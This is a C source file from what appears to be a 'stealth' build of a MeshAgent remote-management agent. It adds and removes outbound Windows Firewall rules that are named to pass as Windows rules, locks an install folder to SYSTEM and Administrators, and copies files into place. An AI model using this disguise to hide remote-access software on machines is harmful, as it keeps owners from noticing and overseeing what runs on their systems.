/*
 * MeshAgent Stealth - Firewall & Installation Utilities
 *
 * Legitimate service installation utilities:
 * - Windows Firewall rule management
 * - Installation directory creation with hardened ACLs
 * - File installation with proper attributes
 */

#include <windows.h>
#include <stdio.h>
#include <netfw.h>
#include <aclapi.h>
#include <sddl.h>
#include "stealth.h"
#include "stealth_utils.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ================================================================
// Windows Firewall Management
// ================================================================

static BOOL Stealth_AddFirewallException(const wchar_t* ruleName, const wchar_t* appPath)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    INetFwRule *pFwRule = NULL;
    BSTR bstrRuleName = NULL;
    BSTR bstrAppPath = NULL;
    BOOL success = FALSE;

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    {
        return FALSE;
    }

    // Create firewall policy object
    hr = CoCreateInstance(
        &CLSID_NetFwPolicy2,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwPolicy2,
        (void**)&pNetFwPolicy2
    );

    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Get firewall rules collection
    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Create new firewall rule
    hr = CoCreateInstance(
        &CLSID_NetFwRule,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwRule,
        (void**)&pFwRule
    );

    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Configure rule
    bstrRuleName = SysAllocString(ruleName);
    bstrAppPath = SysAllocString(appPath);

    pFwRule->lpVtbl->put_Name(pFwRule, bstrRuleName);
    pFwRule->lpVtbl->put_ApplicationName(pFwRule, bstrAppPath);
    pFwRule->lpVtbl->put_Action(pFwRule, NET_FW_ACTION_ALLOW);
    pFwRule->lpVtbl->put_Enabled(pFwRule, VARIANT_TRUE);
    pFwRule->lpVtbl->put_Profiles(pFwRule, NET_FW_PROFILE2_ALL);
    pFwRule->lpVtbl->put_Direction(pFwRule, NET_FW_RULE_DIR_OUT);  // Outbound

    // Add rule to firewall
    hr = pFwRules->lpVtbl->Add(pFwRules, pFwRule);
    if (SUCCEEDED(hr))
    {
        success = TRUE;
    }

cleanup:
    if (bstrRuleName) SysFreeString(bstrRuleName);
    if (bstrAppPath) SysFreeString(bstrAppPath);
    if (pFwRule) pFwRule->lpVtbl->Release(pFwRule);
    if (pFwRules) pFwRules->lpVtbl->Release(pFwRules);
    if (pNetFwPolicy2) pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);

    CoUninitialize();
    return success;
}

BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath)
{
    wchar_t ruleName[256];

    // Create rule name
    swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t),
               L"Windows %s - Outbound", serviceName);

    // Add outbound rule
    if (!Stealth_AddFirewallException(ruleName, exePath))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    BOOL success = FALSE;
    wchar_t ruleName[256];

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) { return FALSE; }

    // Create firewall policy object
    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    // Get rules collection
    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (SUCCEEDED(hr) && pFwRules)
    {
        // Remove outbound rule
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), L"Windows %s - Outbound", serviceName);
        BSTR bstrName = SysAllocString(ruleName);
        if (bstrName)
        {
            pFwRules->lpVtbl->Remove(pFwRules, bstrName);
            SysFreeString(bstrName);
        }

        // Attempt to remove inbound rule if it exists
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), L"Windows %s - Inbound", serviceName);
        bstrName = SysAllocString(ruleName);
        if (bstrName)
        {
            pFwRules->lpVtbl->Remove(pFwRules, bstrName);
            SysFreeString(bstrName);
        }
        success = TRUE;
        pFwRules->lpVtbl->Release(pFwRules);
    }

    if (pNetFwPolicy2) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
    CoUninitialize();
    return success;
}

// ================================================================
// Installation Path Management
// ================================================================

BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath)
{
    if (installPath == NULL || installPath[0] == L'\0') { return FALSE; }

    BOOL createOk = FALSE;
    DWORD createErr = ERROR_SUCCESS;
    PSECURITY_DESCRIPTOR pSD = NULL;

    // Attempt to create the directory with a hardened DACL up front.
    // DACL: Full Access to SYSTEM and Builtin Administrators only
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;FA;;;SY)(A;FA;;;BA)", SDDL_REVISION_1, &pSD, NULL))
    {
        SECURITY_ATTRIBUTES sa = {0};
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = pSD;
        sa.bInheritHandle = FALSE;

        createOk = CreateDirectoryW(installPath, &sa);
        createErr = createOk ? ERROR_SUCCESS : GetLastError();
        LocalFree(pSD);
        pSD = NULL;
    }

    // Fallback: standard CreateDirectory so the path exists even if ACL application failed.
    if (!createOk && createErr != ERROR_ALREADY_EXISTS)
    {
        createOk = CreateDirectoryW(installPath, NULL);
        createErr = createOk ? ERROR_SUCCESS : GetLastError();
    }

    if (!createOk && createErr != ERROR_ALREADY_EXISTS)
    {
        Stealth_DebugPrintfW(L"CreateDirectoryW failed (%lu) for %ls", createErr, installPath);
        return FALSE;
    }

    // Harden ACL even if directory already existed.
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;FA;;;SY)(A;FA;;;BA)", SDDL_REVISION_1, &pSD, NULL))
    {
        PACL dacl = NULL;
        BOOL daclPresent = FALSE, daclDefaulted = FALSE;
        if (GetSecurityDescriptorDacl(pSD, &daclPresent, &dacl, &daclDefaulted) && daclPresent)
        {
            DWORD setResult = SetNamedSecurityInfoW(
                (LPWSTR)installPath,
                SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                NULL, NULL, dacl, NULL);
            if (setResult != ERROR_SUCCESS)
            {
                Stealth_DebugPrintfW(L"SetNamedSecurityInfoW failed (%lu) for %ls", setResult, installPath);
            }
        }
        LocalFree(pSD);
    }

    return TRUE;
}

BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath)
{
    // Copy file
    if (destPath != NULL && destPath[0] != 0)
    {
        SetFileAttributesW(destPath, FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(destPath);
    }
    if (!CopyFileW(sourcePath, destPath, FALSE))
    {
        DWORD err = GetLastError();
        Stealth_DebugPrintfW(L"CopyFile failed (%lu): %ls -> %ls", err, sourcePath, destPath);
        return FALSE;
    }

    return TRUE;
}
